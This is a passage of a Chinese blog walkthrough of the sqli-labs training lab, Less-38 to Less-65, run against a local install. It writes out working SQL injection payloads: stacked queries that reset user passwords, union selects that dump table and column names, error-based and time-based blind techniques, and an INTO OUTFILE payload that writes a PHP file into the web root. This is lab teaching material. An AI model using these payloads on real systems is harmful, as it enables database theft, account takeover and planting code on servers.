<p><img src="https://img-blog.csdnimg.cn/20201011113845227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们正常查询，因为是堆叠注入，那么我们使用分号，来执行两条命令，我们修改dumb的密码试试<br><img src="https://img-blog.csdnimg.cn/202010111139450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用单引号将1闭合，<br><img src="https://img-blog.csdnimg.cn/20201011114212576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>修改成功<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39;;update users set password=&#39;12345&#39; where username=&#39;Dumb&#39; ;--+&#39; LIMIT 0,1&quot;;</code></p>
<h3 id="Less-39-stacked-Query-Intiger-type"><a href="#Less-39-stacked-Query-Intiger-type" class="headerlink" title="Less-39 stacked Query Intiger type"></a>Less-39 stacked Query Intiger type</h3><p><img src="https://img-blog.csdnimg.cn/20201011114917181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>因为是数字型，那么我们这次尝试新增一个用户吧<br><img src="https://img-blog.csdnimg.cn/20201011114948332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>执行成功<br><img src="https://img-blog.csdnimg.cn/20201011115133598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><code> $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
<h3 id="Less-40-stacked-Query-String-type-Blind"><a href="#Less-40-stacked-Query-String-type-Blind" class="headerlink" title="Less-40 stacked Query String type Blind"></a>Less-40 stacked Query String type Blind</h3><p>这关关闭了报错，但是可以根据页面是否有内容来判断，语句是否正确<br><img src="https://img-blog.csdnimg.cn/20201011115338439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>执行成功，使用1’）来闭合<br><img src="https://img-blog.csdnimg.cn/20201011115512497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们再次修改dumb的密码<br><img src="https://img-blog.csdnimg.cn/20201011115534128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>成功</p>
<h3 id="Less-41-stacked-Query-Intiger-type-blind"><a href="#Less-41-stacked-Query-Intiger-type-blind" class="headerlink" title="Less-41 stacked Query Intiger type blind"></a>Less-41 stacked Query Intiger type blind</h3><p>本关是无报错，其余同39关一样</p>
<h3 id="Less-42-Stacked-Query-error-based"><a href="#Less-42-Stacked-Query-error-based" class="headerlink" title="Less-42 - Stacked Query error based"></a>Less-42 - Stacked Query error based</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username &#x3D; mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line">$password &#x3D; $_POST[&quot;login_password&quot;];</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020101111592562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们堆叠注入修改admin的密码<br><img src="https://img-blog.csdnimg.cn/20201011121909100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这是我们之前的密码<br><img src="https://img-blog.csdnimg.cn/20201011122034362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>成功后，<br><img src="https://img-blog.csdnimg.cn/20201011122849305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="less43-POST-Error-based-String-Stacked-with-tiwst-POST型基于错误的堆叠变形字符型注入"><a href="#less43-POST-Error-based-String-Stacked-with-tiwst-POST型基于错误的堆叠变形字符型注入" class="headerlink" title="less43 POST -Error based -String -Stacked with tiwst(POST型基于错误的堆叠变形字符型注入)"></a>less43 POST -Error based -String -Stacked with tiwst(POST型基于错误的堆叠变形字符型注入)</h3><p><img src="https://img-blog.csdnimg.cn/20201011121459346.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020101112150954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>本关是一个登录页面，对密码处没有过滤，那么我们对密码处进行堆叠注入</p>
<p><code>$sql = &quot;SELECT * FROM users WHERE username=(&#39;$username&#39;) and password=(&#39;$password&#39;)&quot;</code><br>这次我们的语句需要闭合‘）了<br><img src="https://img-blog.csdnimg.cn/20201011123202549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201011123227953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201011123445710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>当然首先需要登陆成功<br><img src="https://img-blog.csdnimg.cn/20201011123455185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>修改成功</p>
<h3 id="Less-44-Stacked-Query-blind"><a href="#Less-44-Stacked-Query-blind" class="headerlink" title="Less-44 - Stacked Query blind"></a>Less-44 - Stacked Query blind</h3><p>同less-42关，只是关闭了报错</p>
<h3 id="less-45-基于报错的password处的’-闭合注入"><a href="#less-45-基于报错的password处的’-闭合注入" class="headerlink" title="less-45 基于报错的password处的’)闭合注入"></a>less-45 基于报错的password处的’)闭合注入</h3><p>同less-43关，只是关闭了报错</p>
<h3 id="less-46-ORDER-BY-Error-Numeric"><a href="#less-46-ORDER-BY-Error-Numeric" class="headerlink" title="less-46 ORDER BY-Error-Numeric"></a>less-46 ORDER BY-Error-Numeric</h3><p><img src="https://img-blog.csdnimg.cn/20201012220302505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们按照他的规则，输入试试，发现是一个排序的表格<br><img src="https://img-blog.csdnimg.cn/20201012220336315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输如单引号也发现存在报错，那么我们肯定可以报错注入<br>既然是排序的表格，order by 后面虽然不能进行奇奇怪怪的union注入，但是可以进行desc/asc进行排序<br><img src="https://img-blog.csdnimg.cn/20201012220458834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201012220512154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>那么我们可以尝试报错注入</p>
<p><img src="https://img-blog.csdnimg.cn/20201017224005289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><code>http://127.0.0.1/sqli-labs/Less-46/?sort=(extractvalue(1,concat(0x7e,(select user()),0x7e)))#</code><br><img src="https://img-blog.csdnimg.cn/2020101722453858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>有很明显的延时，说明可以使用时间注入</p>
<p>当然我们可以试试写入文件<br><img src="https://img-blog.csdnimg.cn/20201017225327738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201017225347832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201017224800173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><code>?sort=1 into outfile &quot;D:\\phpStudy\\WWW\\sqli-labs\\Less-46\\111.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</code><br>我们使用十六进制来替代<?php phphinfo();?><br><img src="https://img-blog.csdnimg.cn/20201017225528495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-47-ORDER-BY-Clause-Error-Single-quote"><a href="#Less-47-ORDER-BY-Clause-Error-Single-quote" class="headerlink" title="Less-47 - ORDER BY Clause-Error-Single quote"></a>Less-47 - ORDER BY Clause-Error-Single quote</h3><p><img src="https://img-blog.csdnimg.cn/20201017225728403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源码，我们发现，这里的id增添了单引号而已，其余和46关一致<br><img src="https://img-blog.csdnimg.cn/20201017230156937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-48-ORDER-BY-Clause-Blind-based"><a href="#Less-48-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-48 - ORDER BY Clause Blind based"></a>Less-48 - ORDER BY Clause Blind based</h3><p>同46关，只不过关闭了报错，无法使用报错注入</p>
<h3 id="Less49-ORDER-BY-Clause-Blind-based"><a href="#Less49-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less49 - ORDER BY Clause Blind based"></a>Less49 - ORDER BY Clause Blind based</h3><p>同47，关闭了报错，无法使用报错注入</p>
<h3 id="Less50-ORDER-BY-Clause-Blind-based"><a href="#Less50-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less50 - ORDER BY Clause Blind based"></a>Less50 - ORDER BY Clause Blind based</h3><p><img src="https://img-blog.csdnimg.cn/20201017230407700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>对比46关，存在<code>if (mysqli_multi_query($con1, $sql))</code>说明我们可以进行堆叠注入<br><img src="https://img-blog.csdnimg.cn/20201017231156637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-51-ORDER-BY-Clause-Blind-based"><a href="#Less-51-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-51 - ORDER BY Clause Blind based"></a>Less-51 - ORDER BY Clause Blind based</h3><p>对比47关，多了<code>if (mysqli_multi_query($con1, $sql)) </code><br><img src="https://img-blog.csdnimg.cn/20201017231253592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-52-ORDER-BY-Clause-Blind-based"><a href="#Less-52-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-52 - ORDER BY Clause Blind based"></a>Less-52 - ORDER BY Clause Blind based</h3><p>同50关，关闭了报错，采用报错注入以外的手段</p>
<h3 id="Less-53-ORDER-BY-Clause-Blind-based"><a href="#Less-53-ORDER-BY-Clause-Blind-based" class="headerlink" title="Less-53 - ORDER BY Clause Blind based"></a>Less-53 - ORDER BY Clause Blind based</h3><p>同51关，关闭了报错，采用报错注入以外的手段</p>
<h2 id="Page-4"><a href="#Page-4" class="headerlink" title="Page-4"></a>Page-4</h2><h3 id="Less-54-Challenge-1"><a href="#Less-54-Challenge-1" class="headerlink" title="Less-54:Challenge-1"></a>Less-54:Challenge-1</h3><p>本关只有10次机会，<br><img src="https://img-blog.csdnimg.cn/20201018110958945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201018111342751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们测试1，1‘，1’ –+<br>得出结果  正常，异常，正常，<br>得知，应该是单引号的闭合<br>那么我们使用orderby 查看有几列<br>发现到4的时候没有了回显<br>那么就只有三列，<br> <img src="https://img-blog.csdnimg.cn/20201018111522848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>看到了回显，<br><img src="https://img-blog.csdnimg.cn/20201018111722897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><code>http://127.0.0.1/sqli-labs/Less-54/?id=-1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39; --+</code><br>我们爆出表名<br>接着，查出列名</p>
<p><img src="https://img-blog.csdnimg.cn/20201018111911745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201018112618460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>成功获取到</p>
<h3 id="Less-55-Challenge-2"><a href="#Less-55-Challenge-2" class="headerlink" title="Less-55:Challenge-2"></a>Less-55:Challenge-2</h3><p>经过很多很多很多我们的尝试，发现<code>1） --+</code>可以闭合，<br><img src="https://img-blog.csdnimg.cn/20201018182354240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们让他回显<br><img src="https://img-blog.csdnimg.cn/20201018182547366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201018182745783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查表名，<br><img src="https://img-blog.csdnimg.cn/20201018182958543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>查列名<br><code>http://127.0.0.1/sqli-labs/Less-55/?id=-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;2gaf81dvi5&#39; --+</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201018183236814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>最后一波，极限，</p>
<h3 id="Less-56-Challenge-3"><a href="#Less-56-Challenge-3" class="headerlink" title="Less-56:Challenge-3"></a>Less-56:Challenge-3</h3><p>本关查询语句是<code>SELECT * FROM security.users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code></p>
<p>所以payload换为id=-1’) ··· 其余同上一关</p>
<h3 id="Less-57-Challenge-4"><a href="#Less-57-Challenge-4" class="headerlink" title="Less-57:Challenge-4"></a>Less-57:Challenge-4</h3><p>本关查询语句改为<code>SELECT * FROM security.users WHERE id=&quot;$id&quot; LIMIT 0,1</code></p>
<p>所以payload换为id=-1” ··· 其余同上一关关</p>
<h3 id="Less-58-Challenge-5"><a href="#Less-58-Challenge-5" class="headerlink" title="Less-58:Challenge-5"></a>Less-58:Challenge-5</h3><p>只有五次机会，<br><img src="https://img-blog.csdnimg.cn/20201018185945667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>它存在报错，我们就可以尝试报错注入<br><img src="https://img-blog.csdnimg.cn/20201018190038732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以查询，但是没有回显。<br><img src="https://img-blog.csdnimg.cn/20201018190428690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查到列<br><img src="https://img-blog.csdnimg.cn/20201018191240956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020101819141646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-59-Challenge-6"><a href="#Less-59-Challenge-6" class="headerlink" title="Less-59:Challenge-6"></a>Less-59:Challenge-6</h3><p>本关查询语句<code>SELECT * FROM security.users WHERE id=$id LIMIT 0,1</code></p>
<p>所以payload换为id=-1 ··· 其余同上一关</p>
<h3 id="Less-60-Challenge-7"><a href="#Less-60-Challenge-7" class="headerlink" title="Less-60:Challenge-7"></a>Less-60:Challenge-7</h3><p>本关查询语句<code>SELECT * FROM security.users WHERE id=(&quot;$id&quot;) LIMIT 0,1</code></p>
<p>所以payload换为id=-1”) ··· 其余上一关</p>
<h3 id="Less-61-Challenge-8"><a href="#Less-61-Challenge-8" class="headerlink" title="Less-61:Challenge-8"></a>Less-61:Challenge-8</h3><p>本关查询语句<code>SELECT * FROM security.users WHERE id=((&#39;$id&#39;)) LIMIT 0,1 </code></p>
<p>所以payload换为id=-1’)) ··· 其余同58关</p>
<h3 id="Less-62-Challenge-9"><a href="#Less-62-Challenge-9" class="headerlink" title="Less-62:Challenge-9"></a>Less-62:Challenge-9</h3><p>这关关闭了报错，但是存在很明显的延迟<br><img src="https://img-blog.csdnimg.cn/20201018192404678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201018203228951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>修改这个地方<code>aaa</code> 范围是0~128 ascii码</p>
<h3 id="Less-63-Challenge-10"><a href="#Less-63-Challenge-10" class="headerlink" title="Less-63:Challenge-10"></a>Less-63:Challenge-10</h3><p><code>/Less-63/?id=1&#39; --+</code>,回显正常，说明闭合方式为单引号’</p>
<p>同样时间盲注，跟62关一样。</p>
<h3 id="Less-64-Challenge-11"><a href="#Less-64-Challenge-11" class="headerlink" title="Less-64:Challenge-11"></a>Less-64:Challenge-11</h3><p><code>Less-64/?id=1)) --+</code>页面回显正常验证了就是两括号的闭合方式。<br>时间盲注同62</p>
<h3 id="Less-65-Challenge-12"><a href="#Less-65-Challenge-12" class="headerlink" title="Less-65:Challenge-12"></a>Less-65:Challenge-12</h3><p><code>/Less-65/?id=1&quot;) --+</code>页面回显正常，说明闭合方式为双引号括号”)</p>
<p>同样时间盲注，跟62关一样。</p>

            </div>
            
                <div class="kratos-copyright text-center clearfix">
                    <h5>本作品采用 <a rel="license nofollow" target="_blank" href="http://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
                </div>
            
            <footer class="kratos-entry-footer clearfix">
                
                    <div class="post-like-donate text-center clearfix" id="post-like-donate">
                    
                        <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
                    
                    
                        <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
                        <div class="share-wrap" style="display: none;">
    <div class="share-group">
        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-qq"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-star"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weixin"></i>
            </div>
            <div class="share-int">
                <div class="qrcode" id="wechat-qr"></div>
                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weibo"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-facebook"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-twitter"></i>
            </div>
        </a>
    </div>
    <script type="text/javascript">
        $(()=>{
            new QRCode("wechat-qr", {
                text: "http://wumingzhilian.github.to/2020/10/18/Sqli-labs-%E5%A4%A7%E5%AE%8C%E7%BB%93/",
                width: 150,
                height: 150,
                correctLevel : QRCode.CorrectLevel.H
            });
        });
        function share(dest) {
            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
            const weiboBase     = "https://service.weibo.com/share/share.php?";
            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
            const twitterBase   = "https://twitter.com/intent/tweet?";
            const hostUrl       = "http://wumingzhilian.github.to/2020/10/18/Sqli-labs-%E5%A4%A7%E5%AE%8C%E7%BB%93/";
            const title         = "「Sqli-labs 大完结」";
            const excerpt       = `@toc
题目page-1Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)
1http:&#x2F;&#x2F;127.0.0.1&#x2F;sql...`;
            let _URL;
            switch (dest) {
                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
            }
            window.open(_URL);
        };
    </script>
</div>
                    
                    </div>
                
                <div class="footer-tag clearfix">
                    <div class="pull-left">
                    <i class="fa fa-tags"></i>
                        <a class="tag-none-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a>
                    </div>
                    <div class="pull-date">
                    <span>最后编辑：2020-10-18</span>
                    </div>
                </div>
            </footer>
        </div>
        
            <nav class="navigation post-navigation clearfix" role="navigation">
                
                <div class="nav-previous clearfix">
                    <a title=" wuming/unserialize" href="/2020/09/05/0ctf-2016-Web-unserialize/">&lt; 上一篇</a>
                </div>
                
                
                <div class="nav-next clearfix">
                    <a title=" Sql注入总结学习" href="/2020/10/18/Sql注入总结学习/">下一篇 &gt;</a>
                </div>
                
            </nav>
        
        
